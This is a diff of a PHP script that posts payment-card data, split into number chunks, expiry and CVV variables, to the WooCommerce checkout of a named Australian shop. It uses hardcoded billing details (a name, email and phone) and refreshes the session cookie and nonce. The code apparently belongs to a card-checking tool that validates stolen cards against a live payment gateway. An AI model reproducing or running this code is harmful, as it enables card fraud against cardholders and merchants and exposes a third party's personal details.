@@ -310,7 +310,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: woocommerce_items_in_cart=1; wp_woocommerce_session_f2b6ce89df5c555c20d2734335c3d66b=c6af5fe4659f758ad0f19be2c77937ef%7C%7C1590945991%7C%7C1590942391%7C%7C1f491c8d64bb2e18fb550a0b40686852; woocommerce_cart_hash=5ac75155463701cb7107f4154ddf2d76',
+'cookie: wp_woocommerce_session_f2b6ce89df5c555c20d2734335c3d66b=c6af5fe4659f758ad0f19be2c77937ef%7C%7C1590945991%7C%7C1590942391%7C%7C1f491c8d64bb2e18fb550a0b40686852; woocommerce_recently_viewed=32; woocommerce_items_in_cart=1; woocommerce_cart_hash=5ac75155463701cb7107f4154ddf2d76',
 'origin: https://lumera.com.au',
 'referer: https://lumera.com.au/checkout/',
 'user-agent: '.$browser.'',
@@ -318,7 +318,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 
 // //////////////////////// START POST FILED 1 ////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Megha&billing_last_name=Shyam&billing_company=&billing_country=AU&billing_address_1=661+STATE+ST&billing_address_2=&billing_city=BINGHAMTON&billing_state=NSW&billing_postcode=2150&billing_phone=%2B61424152415&billing_email=pubgkittu%40gmail.com&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=VIC&shipping_postcode=&order_comments=Leave+at+Front+Door+if+not+home&shipping_method%5B0%5D=table_rate%3A4%3A6&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&woocommerce-process-checkout-nonce=429bab36c0&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Megha&billing_last_name=Shyam&billing_company=&billing_country=AU&billing_address_1=661+STATE+ST&billing_address_2=&billing_city=BINGHAMTON&billing_state=NSW&billing_postcode=2150&billing_phone=%2B61424152415&billing_email=pubgkittu%40gmail.com&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=VIC&shipping_postcode=&order_comments=Leave+at+Front+Door+if+not+home&shipping_method%5B0%5D=table_rate%3A4%3A6&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano.'&anz_egate-card-cvc='.$cvv.'&woocommerce-process-checkout-nonce=2ea6ce4822&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
 
 
 
